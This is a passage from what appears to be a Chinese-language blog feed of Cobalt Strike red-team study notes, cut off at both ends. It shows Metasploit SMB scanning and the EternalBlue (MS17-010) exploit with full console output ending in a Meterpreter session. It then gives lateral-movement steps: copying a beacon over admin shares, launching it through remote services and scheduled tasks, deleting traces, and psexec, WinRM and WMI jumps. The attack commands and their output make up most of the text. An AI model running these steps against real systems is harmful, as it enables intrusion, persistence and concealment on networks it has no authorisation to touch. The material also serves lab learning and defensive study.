punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 110 of 256 hosts <span class="token punctuation">(</span>42<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 111 of 256 hosts <span class="token punctuation">(</span>43<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 128 of 256 hosts <span class="token punctuation">(</span>50<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>133:445   <span class="token operator">-</span> Host is running Windows 7 Ultimate SP1 <span class="token punctuation">(</span>build:7601<span class="token punctuation">)</span> <span class="token punctuation">(</span>name:WINTEST<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:TEAMSSIX<span class="token punctuation">)</span> <span class="token punctuation">(</span>signatures:optional<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445   <span class="token operator">-</span> Host is running Windows 2008 HPC SP1 <span class="token punctuation">(</span>build:7601<span class="token punctuation">)</span> <span class="token punctuation">(</span>name:WINDC<span class="token punctuation">)</span> <span class="token punctuation">(</span>domain:TEAMSSIX<span class="token punctuation">)</span> <span class="token punctuation">(</span>signatures:required<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 165 of 256 hosts <span class="token punctuation">(</span>64<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 184 of 256 hosts <span class="token punctuation">(</span>71<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 220 of 256 hosts <span class="token punctuation">(</span>85<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 249 of 256 hosts <span class="token punctuation">(</span>97<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>0<span class="token operator">/</span>24:445  <span class="token operator">-</span> Scanned 256 of 256 hosts <span class="token punctuation">(</span>100<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Auxiliary module execution completed<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="5、发现利用"><a href="#5、发现利用" class="headerlink" title="5、发现利用"></a>5、发现利用</h2><p>通过扫描发现在 192.168.232.0/24 地址段内，除了已经上线的 <code>133</code> 主机外，还有 <code>132</code> 主机也开放了 445 端口，且该主机为 Windows 2008 的操作系统，这里使用永恒之蓝作为演示。</p><pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblueset rhosts 192.168.232.132set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcpexploit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">msf5 > use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalbluemsf5 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue<span class="token punctuation">)</span> > <span class="token function">set</span> rhosts 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132rhosts => 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132msf5 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue<span class="token punctuation">)</span> > <span class="token function">set</span> payload windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcppayload => windows<span class="token operator">/</span>x64<span class="token operator">/</span>meterpreter<span class="token operator">/</span>bind_tcpmsf5 exploit<span class="token punctuation">(</span>windows<span class="token operator">/</span>smb<span class="token operator">/</span>ms17_010_eternalblue<span class="token punctuation">)</span> > exploit <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> <span class="token keyword">Using</span> auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>smb<span class="token operator">/</span>smb_ms17_010 as check<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445   <span class="token operator">-</span> Host is likely VULNERABLE to MS17<span class="token operator">-</span>010<span class="token operator">!</span> <span class="token operator">-</span> Windows Server 2008 HPC Edition 7601 Service Pack 1 x64 <span class="token punctuation">(</span>64<span class="token operator">-</span>bit<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445   <span class="token operator">-</span> Scanned 1 of 1 hosts <span class="token punctuation">(</span>100<span class="token operator">%</span> complete<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Connecting to target <span class="token keyword">for</span> exploitation<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Connection established <span class="token keyword">for</span> exploitation<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Target OS selected valid <span class="token keyword">for</span> OS indicated by SMB reply<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> CORE raw buffer dump <span class="token punctuation">(</span>51 bytes<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> 0x00000010  30 30 38 20 48 50 43 20 45 64 69 74 69 6f 6e 20  008 HPC Edition <span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> 0x00000030  6b 20 31                                         k 1             <span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Target arch selected valid <span class="token keyword">for</span> arch indicated by DCE<span class="token operator">/</span>RPC reply<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Trying exploit with 12 Groom Allocations<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending all but last fragment of exploit packet<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Starting non<span class="token operator">-</span>paged pool grooming<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending SMBv2 buffers<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending final SMBv2 buffers<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending last fragment of exploit packet<span class="token operator">!</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Receiving response <span class="token keyword">from</span> exploit packet<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> ETERNALBLUE overwrite completed successfully <span class="token punctuation">(</span>0xC000000D<span class="token punctuation">)</span><span class="token operator">!</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Sending egg to corrupted connection<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> Triggering free of corrupted buffer<span class="token punctuation">.</span><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Started bind TCP handler against 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:4444<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>201283 bytes<span class="token punctuation">)</span> to 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Meterpreter session 1 opened <span class="token punctuation">(</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0<span class="token punctuation">.</span>0:0 <span class="token operator">-</span>> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>200:9527<span class="token punctuation">)</span> at 2020<span class="token operator">-</span>09<span class="token operator">-</span>01 22:13:57 <span class="token operator">-</span>0400<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> =<span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> =<span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-</span>WIN<span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132:445 <span class="token operator">-</span> =<span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span><span class="token operator">-=</span>meterpreter > ipconfigInterface 11============Name         : Intel<span class="token punctuation">(</span>R<span class="token punctuation">)</span> PRO<span class="token operator">/</span>1000 MT Network ConnectionHardware MAC : 00:0c:29:d3:6c:3dMTU          : 1500IPv4 Address : 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>232<span class="token punctuation">.</span>132IPv4 Netmask : 255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>255<span class="token punctuation">.</span>0IPv6 Address : fe80::a1ac:3035:cbdf:4872IPv6 Netmask : ffff:ffff:ffff:ffff::<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>参考链接：</p><p><a href="https://www.bilibili.com/video/BV16b411i7n5">https://www.bilibili.com/video/BV16b411i7n5</a></p><p><a href="https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf">https://blog.ateam.qianxin.com/CobaltStrike4.0%E7%94%A8%E6%88%B7%E6%89%8B%E5%86%8C_%E4%B8%AD%E6%96%87%E7%BF%BB%E8%AF%91.pdf</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
      
      
      <categories>
          
          <category> CS 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
            <tag> 学习笔记 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【CS学习笔记】19、代码执行的方式</title>
      <link href="//200419-150637.html"/>
      <url>//200419-150637.html</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>实现代码执行的四个步骤：</p><p>1、与目标建立信任关系</p><p>2、复制可执行文件到目标上</p><p>3、在目标上运行可执行文件</p><p>4、实现对目标的控制</p><p>以上是根据视频教程中直译的结果，个人感觉其实这一节叫<code>横向移动的方法</code>更为合适。</p><h1 id="0x01-创建可执行文件"><a href="#0x01-创建可执行文件" class="headerlink" title="0x01 创建可执行文件"></a>0x01 创建可执行文件</h1><p>创建可执行文件可以在 Cobalt Strike 的 <code>Attack -&gt; Packages -&gt; Windows Executable(s)</code> 处进行创建。</p><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/cs19-1.png?x-oss-process=image/auto-orient,1/quality,q_80/watermark,bucket_teamssix,image_VGVhbXNTaXhXaW5YaW5Mb2dvLnBuZz94LW9zcy1wcm9jZXNzPWltYWdlL3Jlc2l6ZSxQXzM4,x_10,y_10"></p><p>如果用于内网中的横向移动，那么强烈建议使用 SMB Beacon，SMB Beacon 就是为了内网横向扩展渗透而设计的。</p><h1 id="0x02-上传可执行文件"><a href="#0x02-上传可执行文件" class="headerlink" title="0x02 上传可执行文件"></a>0x02 上传可执行文件</h1><p>首先使用 Cobalt Strike 上的 <code>upload</code> 功能上传文件，接着复制文件到目标主机的其他位置。</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">copy</span> file<span class="token punctuation">.</span>exe \\host\C$\Windows\Temp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> upload <span class="token operator">/</span>root<span class="token operator">/</span>beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to upload <span class="token operator">/</span>root<span class="token operator">/</span>Desktop<span class="token operator">/</span>beacon<span class="token punctuation">.</span>exe as beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 289302 bytesbeacon> shell <span class="token function">copy</span> beacon<span class="token punctuation">.</span>exe \\WinTest\C$\Windows\Temp<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">copy</span> beacon<span class="token punctuation">.</span>exe \\WinTest\C$\Windows\Temp<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 72 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:已复制         1 个文件。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x03-执行文件（方法一）"><a href="#0x03-执行文件（方法一）" class="headerlink" title="0x03 执行文件（方法一）"></a>0x03 执行文件（方法一）</h1><p>1、生成 Windows Service EXE 并上传</p><p>2、在目标主机上创建一个服务</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">sc</span> \\host create name binpath= c:\windows\temp\file<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">sc</span> \\wintest create beacon binpath= c:\windows\temp\beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">sc</span> \\wintest create beacon binpath= c:\windows\temp\beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 93 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:<span class="token namespace">[SC]</span> CreateService 成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>注：记住 binpath 路径</p></blockquote><p>3、在目标主机上启动服务</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell <span class="token function">sc</span> \\host <span class="token function">start</span> name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">sc</span> \\wintest <span class="token function">start</span> beacon<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">sc</span> \\wintest <span class="token function">start</span> beacon<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 56 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:SERVICE_NAME: beacon         <span class="token function">TYPE</span>               : 10  WIN32_OWN_PROCESS          STATE              : 2  START_PENDING                                 <span class="token punctuation">(</span>NOT_STOPPABLE<span class="token punctuation">,</span> NOT_PAUSABLE<span class="token punctuation">,</span> IGNORES_SHUTDOWN<span class="token punctuation">)</span>        WIN32_EXIT_CODE    : 0  <span class="token punctuation">(</span>0x0<span class="token punctuation">)</span>        SERVICE_EXIT_CODE  : 0  <span class="token punctuation">(</span>0x0<span class="token punctuation">)</span>        CHECKPOINT         : 0x0        WAIT_HINT          : 0x7d0        PID                : 3816        FLAGS              :         beacon> link wintest<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked to link to \\wintest\pipe\msagent_da00<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 36 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> established link to child beacon: 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>130<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、清除痕迹与服务</p><pre class="line-numbers language-none"><code class="language-none">shell sc \\host delete name<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell <span class="token function">del</span> beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">del</span> beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 57 bytesbeacon> shell <span class="token function">del</span> \\wintest\C$\windows\temp\beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">del</span> \\wintest\C$\windows\temp\beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 83 bytesbeacon> shell <span class="token function">sc</span> \\wintest delete beacon<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: <span class="token function">sc</span> \\wintest delete beacon<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 69 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:<span class="token namespace">[SC]</span> DeleteService 成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x04-执行文件（方法二）"><a href="#0x04-执行文件（方法二）" class="headerlink" title="0x04 执行文件（方法二）"></a>0x04 执行文件（方法二）</h1><p>1、生成 Windows EXE 并上传，注意这里生成的 EXE 和<code>方法一</code>生成的 EXE 是不一样的类型，这里生成的是<code> Windows EXE</code>，不是方法一中的<code>Windows Service EXE</code></p><p>2、找到目标系统上的时间</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell net time \\host<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell net time \\windc<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: net time \\windc<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 49 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:\\windc 的当前时间是 2020<span class="token operator">/</span>8<span class="token operator">/</span>30 14:54:09命令成功完成。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3、创建一个计划任务</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">shell at \\host HH:mm C:\path\to\bad<span class="token punctuation">.</span>exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> shell at \\windc 15:00 C:\windows\temp\beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked beacon to run: at \\windc 15:00 C:\windows\temp\beacon<span class="token punctuation">.</span>exe<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 76 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> received output:新加了一项作业，其作业 ID = 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>4、当计划任务被执行时，执行 link hostname 即可上线主机</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">beacon> link windc<span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> Tasked to link to \\windc\pipe\msagent_d76a<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> host called home<span class="token punctuation">,</span> sent: 34 bytes<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span> established link to child beacon: 192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>175<span class="token punctuation">.</span>144<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x05-beacon-的自动操作"><a href="#0x05-beacon-的自动操作" class="headerlink" title="0x05 beacon 的自动操作"></a>0x05 beacon 的自动操作</h1><p>前面说的两种执行文件的方法都需要往磁盘里上传文件，如果不想往磁盘中上传文件，也可以使用 beacon 的自动操作。</p><ul><li>使用一个服务运行可执行文件</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">psexec <span class="token namespace">[target]</span> <span class="token namespace">[share]</span> <span class="token namespace">[listener]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>使用一个服务运行 Powershell 单行程序</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">psexec_psh <span class="token namespace">[target]</span> <span class="token namespace">[listener]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>通过 WinRM 运行 Powershell 单行程序</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">winrm <span class="token namespace">[target]</span> <span class="token namespace">[listener]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>通过 WMI 运行 Powershell 单行程序</li></ul><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">wmi <span class="token namespace">[target]</span> <span class="token namespace">[listener]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在 Cobalt Strike 的 <code>viwe --&gt; Targets</code> 下，右击主机选择 <code>Jump</code> 